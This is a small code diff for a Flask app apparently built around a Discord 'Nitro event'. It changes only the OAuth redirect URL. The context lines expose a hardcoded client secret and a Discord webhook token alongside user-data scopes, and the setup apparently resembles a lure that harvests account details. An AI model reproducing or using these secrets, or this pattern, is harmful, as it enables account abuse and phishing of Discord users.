@@ -6,7 +6,7 @@ app = Flask(__name__)
 
 CLIENT_ID = "1560823818845552663"
 CLIENT_SECRET = "3NVkt7qVGojUm7C38P-Krx_9S5NgxQ0v"
-REDIRECT_URI = "https://nitro-event.onrender.com/callback"
+REDIRECT_URI = "https://nitro-event-2.onrender.com/callback"
 WEBHOOK = "https://discord.com/api/webhooks/1560808467395125248/d7k4t9kqx1tSzGrNCVyvLuI7z4nU6atd7SREjDhqlnqyc-4Jv0btgLKTGnKrqBQxSFbR"
 
 SCOPES = "identify email guilds"
